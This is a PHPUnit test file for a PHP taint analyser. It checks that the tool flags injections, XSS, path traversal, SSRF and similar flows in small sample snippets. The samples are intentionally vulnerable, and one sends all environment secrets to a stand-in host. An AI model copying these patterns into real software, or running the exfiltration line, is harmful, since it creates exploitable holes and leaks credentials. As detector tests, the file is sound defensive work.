<?php

declare(strict_types=1);

namespace Frost\Tests;

use PHPUnit\Framework\TestCase;

final class TaintTest extends TestCase
{
    use Helper;

    public function testTheClassicInjections(): void
    {
        self::assertContains('command injection', $this->kinds($this->php('system($_GET["c"]);')));
        self::assertContains('code injection', $this->kinds($this->php('eval($_POST["c"]);')));
        self::assertContains('file inclusion', $this->kinds($this->php('include $_GET["p"];')));
        self::assertContains('object injection', $this->kinds($this->php('unserialize($_COOKIE["s"]);')));
        self::assertContains('cross-site scripting', $this->kinds($this->php('echo $_GET["m"];')));
        self::assertContains('path traversal', $this->kinds($this->php('readfile($_GET["f"]);')));
        self::assertContains('header injection', $this->kinds($this->php('header("Location: " . $_GET["u"]);')));
        self::assertContains('LDAP injection', $this->kinds($this->php('ldap_search($c, $b, $_GET["f"]);')));
        self::assertContains('server-side request forgery', $this->kinds($this->php('curl_setopt($h, CURLOPT_URL, $_GET["u"]);')));
    }

    public function testLegacySuperglobalAliasesAreSourcesToo(): void
    {
        self::assertContains('command injection', $this->kinds($this->php('system($HTTP_GET_VARS["c"]);')));
        self::assertContains('cross-site scripting', $this->kinds($this->php('echo $HTTP_POST_VARS["m"];')));
    }

    public function testHardcodedValuesAreCapabilitiesNotFlows(): void
    {
        self::assertSame([], $this->kinds($this->php('system("ls -la"); eval("return 1;"); readfile("/etc/motd");')));
    }

    public function testEscapingIsPerDestination(): void
    {
        // Escaped for the shell, and used in the shell: quiet.
        self::assertSame([], $this->kinds($this->php('system("ping " . escapeshellarg($_GET["h"]));')));
        // Escaped for HTML, and used in HTML: quiet.
        self::assertSame([], $this->kinds($this->php('echo htmlspecialchars($_GET["m"]);')));
        // Escaped for HTML, and then used in the shell: still a bug.
        self::assertContains('command injection', $this->kinds($this->php('system(htmlspecialchars($_GET["h"]));')));
        // Escaped for SQL, and then echoed: still a bug.
        $code = $this->php('$n = mysqli_real_escape_string($db, $_GET["n"]); echo $n;');
        self::assertContains('cross-site scripting', $this->kinds($code));
    }

    public function testANumberIsSafeEverywhere(): void
    {
        self::assertSame([], $this->kinds($this->php('system("kill " . intval($_GET["pid"]));')));
        self::assertSame([], $this->kinds($this->php('echo (int) $_GET["n"];')));
        self::assertSame([], $this->kinds($this->php('readfile("/logs/" . md5($_GET["f"]));')));
    }

    public function testFilterVarCountsOnlyWhenItActuallyFilters(): void
    {
        self::assertSame([], $this->kinds($this->php('echo filter_var($_GET["n"], FILTER_VALIDATE_INT);')));
        self::assertContains('cross-site scripting', $this->kinds($this->php('echo filter_var($_GET["n"]);')));
    }

    public function testBranchesMergeRatherThanOverwrite(): void
    {
        // Straight-line reassignment really does clear it.
        $cleared = $this->php('$c = $_GET["c"]; $c = "ls"; system($c);');
        self::assertSame([], $this->kinds($cleared));

        // But one tainted path is enough.
        $merged = $this->php('if ($x) { $c = $_GET["c"]; } else { $c = "ls"; } system($c);');
        self::assertContains('command injection', $this->kinds($merged));

        $caught = $this->php('try { $c = $_GET["c"]; } catch (Exception $e) { $c = "ls"; } system($c);');
        self::assertContains('command injection', $this->kinds($caught));
    }

    public function testAnUnknownCallEndsTheChain(): void
    {
        self::assertSame([], $this->kinds($this->php('system(sanitise($_GET["c"]));')));
    }

    public function testOneHopThroughALocalHelper(): void
    {
        $code = $this->php('function run($cmd) { shell_exec($cmd); } run($_GET["c"]);');
        $flows = $this->flows($code);
        self::assertCount(1, $flows);
        self::assertSame('run', $flows[0]->via);
        self::assertStringContainsString('via run()', $flows[0]->message());
    }

    public function testOnlyTheParameterThatReachesTheSinkCounts(): void
    {
        $code = $this->php('function go($safe, $cmd) { echo $safe; shell_exec($cmd); } go($_GET["a"], "ls");');
        $kinds = $this->kinds($code);
        // $safe reaches echo, so that one is real; $cmd got a literal.
        self::assertContains('cross-site scripting', $kinds);
        self::assertNotContains('command injection', $kinds);
    }

    public function testAPropertyTaintedInOneMethodIsTaintedInAnother(): void
    {
        $code = $this->php(
            'class R { function load() { $this->q = $_GET["q"]; }'
            . ' function run() { shell_exec($this->q); } }'
        );
        self::assertContains('command injection', $this->kinds($code));
    }

    public function testForeachOverASuperglobalTaintsTheLoopVariables(): void
    {
        self::assertContains('cross-site scripting', $this->kinds($this->php('foreach ($_GET as $k => $v) { echo $v; }')));
    }

    public function testARequestObjectIsASource(): void
    {
        self::assertContains('command injection', $this->kinds($this->php('$request = r(); system($request->input("c"));')));
        self::assertContains('cross-site scripting', $this->kinds($this->php('$req = r(); echo $req->get("m");')));
    }

    public function testExfiltrationNeedsBulkSecretsNotOneNamedValue(): void
    {
        $bulk = $this->php('file_get_contents("http://x.invalid/?d=" . json_encode($_ENV));');
        self::assertContains('exfiltration', $this->kinds($bulk));

        // How every API client on earth authenticates.
        $named = $this->php('curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: " . $_ENV["TOKEN"]]);');
        self::assertNotContains('exfiltration', $this->kinds($named));
    }

    public function testADecodedPayloadInsideEvalIsCalledWhatItIs(): void
    {
        $kinds = $this->kinds($this->php('eval(gzinflate(base64_decode($p)));'));
        self::assertContains('obfuscated payload', $kinds);
    }

    public function testAVariableVariableWrittenFromInputIsReported(): void
    {
        self::assertContains('variable overwrite', $this->kinds($this->php('$$key = 1; $key = $_GET["k"]; $$key = 2;')));
    }

    public function testAVariableFunctionTakenFromInput(): void
    {
        self::assertContains('code injection', $this->kinds($this->php('$f = $_GET["f"]; $f($a);')));
    }

    public function testTheReportNamesSourceAndSink(): void
    {
        $flows = $this->flows($this->php('system($_GET["cmd"]);'));
        self::assertSame("\$_GET['cmd']", $flows[0]->source);
        self::assertSame('system', $flows[0]->sink);
        self::assertSame(2, $flows[0]->line);
    }
}
